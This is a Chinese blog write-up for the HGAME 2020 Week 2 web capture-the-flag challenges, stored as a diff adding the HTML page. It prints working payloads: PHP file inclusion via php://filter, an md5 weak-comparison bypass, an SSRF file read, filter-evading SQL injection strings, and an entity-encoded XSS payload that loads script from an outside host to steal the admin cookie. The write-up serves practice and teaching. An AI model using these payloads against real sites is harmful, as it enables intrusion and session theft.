@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ThotH">
+
+
+
+
+
+<title>HGAME 2020 WEEK2 Web Writeup | ThotH</title>
+
+
+
+    <link rel="icon" href="/%5Bobject%20Object%5D">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">ThotH&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">ThotH&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HGAME 2020 WEEK2 Web Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">ThotH</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">三月 2, 2020&nbsp;&nbsp;19:49:33</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>[TOC]</p>
+<h1 id="HGAME2020-WEEK2-Web-WriteUp"><a href="#HGAME2020-WEEK2-Web-WriteUp" class="headerlink" title="HGAME2020 WEEK2 Web WriteUp"></a>HGAME2020 WEEK2 Web WriteUp</h1><p>Week1只能算是签到题~到了Week2题目的考点才算是ctf常见的考点了，在第二周也算是温习并且学到了一些新的技巧。</p>
+<h2 id="0x1-Cosmos的博客后台"><a href="#0x1-Cosmos的博客后台" class="headerlink" title="0x1 Cosmos的博客后台"></a>0x1 Cosmos的博客后台</h2><p> 进入题目，发现是一个登陆页面，查看url发现</p>
+<pre>http://cosmos-admin.hgame.day-day.work/?action=login.php</pre>
+<p>从而考虑文件包含漏洞。利用php伪协议读取源码：</p>
+<pre>?action=php://filter/convert.base64-encode/resource=login.php</pre>
+<p>解码得到login.php源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">        $debug &#x3D; $_GET[&#39;debug&#39;];</span><br><span class="line">        if (!preg_match(&quot;&#x2F;^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$&#x2F;&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">        if ($admin_password &#x3D;&#x3D; md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; $admin_username)&#123;</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;用户名或密码错误&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmos的博客后台&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;signin.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;sticky-footer.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class&#x3D;&quot;form-signin&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class&#x3D;&quot;form-signin-heading&quot;&gt;后台登陆&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;用户名&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;密码&quot; required&gt;</span><br><span class="line">        &lt;input class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;footer class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;text-muted&quot;&gt;Created by Annevi&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;footer&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到还有config.php和admin.php，继续尝试包含，当包含config时出现waf，判断有过滤，尝试查看index，得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$action = @$_GET[<span class="string">'action'</span>];</span><br><span class="line">$filter = <span class="string">"/config|etc|flag/i"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($filter, $_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker get out!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">include</span> $action;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>waf导致没法直接得到flag文件源码，只能另找办法。回看login.php源码，发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现在debug模式下有一个$$debug,可以通过<strong>可变变量</strong>来得到<strong>admin_username</strong>和<strong>admin_password</strong>,同时发现在密码判断的部分，采用的是弱比较</p>
+<blockquote>
+<p>0e 纯数字的字符串在判断相等的时候会被认为是科学计数法的数字，比较时首先会做字符串到数字的转换。<br>转换后都成为了0的n次方，相等。</p>
+</blockquote>
+<p>所以就是一个常见的md5碰撞的技巧。</p>
+<p>常见的md5碰撞：<a href="https://www.cnblogs.com/Jie-Fei/p/9886598.html" target="_blank" rel="noopener">https://www.cnblogs.com/Jie-Fei/p/9886598.html</a></p>
+<p>得到账号为Cosmos!，进入后台</p>
+<p><img src="/.io//web1.1.jpg" alt="web1.1"></p>
+<p>发现插入图片功能，而且是通过url来实现，查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据提示flag在本地，同时限制了host，构造payload:</p>
+<pre>file://localhost/flag</pre>
+<p>在源码查看：</p>
+<pre>src="data:image/jpeg;base64,aGdhbWV7cEhwXzFzX1RoM19CM3NUX0w0bkd1NGdFIUAhfQo="</pre>
+<p>base64解码得到flag:hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p>
+<h2 id="0x2-Cosmos的留言板-1"><a href="#0x2-Cosmos的留言板-1" class="headerlink" title="0x2 Cosmos的留言板-1"></a>0x2 Cosmos的留言板-1</h2><p>考点：sql注入</p>
+<p>点开链接，发现id处可注入且有回显，进行fuzz测试，只过滤了空格和select，空格使用/**/绕过，select可用双写绕过。</p>
+<p>order by 判断只有一列，开始注入</p>
+<pre>' union select database();#
+'/**/union/**/selselectect/**/database();#
+%27%2f**%2funion%2f**%2fselselectect%2f**%2fdatabase()%3b%23
+  #得到数据库为 easysql</pre>
+
+<pre>' union select group_concat(table_name) from information_schema.tables where table_schema='easysql';#
+'/**/union/**/selselectect/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='easysql';#
+id=%27union%2f**%2fselselectect%2f**%2fgroup_concat(table_name)%2f**%2ffrom% 2f**%2finformation_schema.tables%2f**%2fwhere%2f**%2ftable_schema%3d%27easys ql%27%3b%23  # flag的表为f1aggggggggggggg</pre>
+
+<pre>' union select fl4444444g from f1aggggggggggggg;#
+'/**/union/**/selselectect/**/fl4444444g/**/from/**/f1aggggggggggggg;# id=%27%2f**%2funion%2f**%2fselselectect%2f**%2ffl4444444g%2f**%2ffrom%2f** %2ff1aggggggggggggg%3b%23 
+#得到flag</pre>
+
+<p>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</p>
+<h2 id="0x3-Cosmos的新语言"><a href="#0x3-Cosmos的新语言" class="headerlink" title="0x3 Cosmos的新语言"></a>0x3 Cosmos的新语言</h2><p>考点：简易脚本</p>
+<p>点开题目发现代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code = file_get_contents(<span class="string">'mycode'</span>);</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure>
+
+<p>访问mycode：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(strrev(str_rot13(strrev(base64_encode(base64_encode(base64_encode(encrypt(strrev(encrypt($_SERVER[<span class="string">'token'</span>])))))))))));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(@$_POST[<span class="string">'token'</span>] === $_SERVER[<span class="string">'token'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span>($_SERVER[<span class="string">'flag'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现就是一个层层嵌套的加密（老千层饼了），原本以为只要自己解开即可，但发现token每隔一段时间会改变，且编码函数也会随机变化，只能用脚本自己提交了。附上官方writeup脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++) &#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://challenge.url.here/'</span>; </span><br><span class="line">$token = file_get_contents($url); $token = explode(<span class="string">"\n"</span>, $token); $token = substr($token[<span class="number">4</span>], <span class="number">0</span>, <span class="number">-4</span>); $token = html_entity_decode($token);</span><br><span class="line">$op_function = file_get_contents($url . <span class="string">'/mycode'</span>);</span><br><span class="line">$op_function = explode(<span class="string">"\n"</span>, $op_function)[<span class="number">8</span>];</span><br><span class="line">$op_function = explode(<span class="string">'('</span>, $op_function);</span><br><span class="line">$op_function = array_slice($op_function, <span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($op_function <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ($value) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'base64_encode'</span>:</span><br><span class="line">            $token = base64_decode($token);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'strrev'</span>:</span><br><span class="line">            $token = strrev($token);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'str_rot13'</span>:</span><br><span class="line">            $token = str_rot13($token);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'encrypt'</span>:</span><br><span class="line">            $token = decrypt($token);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$options[<span class="string">'http'</span>] = <span class="keyword">array</span>(<span class="string">'method'</span> =&gt; <span class="string">'POST'</span>, <span class="string">'header'</span> =&gt; <span class="string">'Content-Type: application/x-www-form-urlencoded'</span>, <span class="string">'content'</span> =&gt; http_build_query(<span class="keyword">array</span>(<span class="string">'token'</span> =&gt; $token)));</span><br><span class="line">$result = file_get_contents($url, <span class="keyword">false</span>, stream_context_create($options)); </span><br><span class="line"><span class="keyword">echo</span>($result);</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x4-Cosmos的聊天室"><a href="#0x4-Cosmos的聊天室" class="headerlink" title="0x4 Cosmos的聊天室"></a>0x4 Cosmos的聊天室</h2><p>考点：xss</p>
+<p>xss一直没有什么很好的练习机会，这次算是一个比较好的机会，在fuzz的时候只发现了出题人将所有的消息转换为大写字母，而且过滤了所有的标签，于是便不知道怎么做了，查看官方wp后才知道是过滤了所以的闭合标签</p>
+<blockquote>
+<p>留言板过滤了所有闭合的html标签，可以使用浏览器事件执行js，不闭合右标签，浏览器会自动补全，最后加注释，注视掉后面拼过来的即可，大写可以用html实体绕过</p>
+</blockquote>
+<p>最后payload为：</p>
+<p>&lt;img src=x onerror=s=createElement(‘script’);body.appendChild(s);s.src=’你的js地址’;&gt;</p>
+<p>编码后为:<br>&lt;img src=x onerror=&amp;#115&amp;#61&amp;#99&amp;#114&amp;#101&amp;#97&amp;#116&amp;#101&amp;#69&amp;#108&amp;#101&amp;#109&amp;#101&amp;#110&amp;#116<br><br>&amp;#40&amp;#39&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#39&amp;#41&amp;#59&amp;#98&amp;#111&amp;#100&amp;#121&amp;#46&amp;#97&amp;#112&amp;#112&amp;#101&amp;#110&amp;#100<br><br>&amp;#67&amp;#104&amp;#105&amp;#108&amp;#100&amp;#40&amp;#115&amp;#41&amp;#59&amp;#115&amp;#46&amp;#115&amp;#114&amp;#99&amp;#61&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#4<br><br>7&amp;#120&amp;#115&amp;#115&amp;#104&amp;#115&amp;#46&amp;#99&amp;#110&amp;#47&amp;#89&amp;#83&amp;#49&amp;#120&amp;#39&amp;#59&amp;#47&amp;#47</p>
+<p>提交时有一个验证码，用py写个脚本爆破一下即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]==str(s):</span><br><span class="line">            print(i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">main(验证码)</span><br></pre></td></tr></table></figure>
+
+<p>在xss平台得到管理员cookie，替换得到flag。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>ThotH</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://arthurgu.github.io/2020/03/02/HGAME%202020%20WEEK2%20Web%20Writeup/">https://arthurgu.github.io/2020/03/02/HGAME%202020%20WEEK2%20Web%20Writeup/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/03/02/HGAME%202020%20WEEK1%20Web%20Writeup/">HGAME 2020 WEEK1 Web Writeup</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© ThotH | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
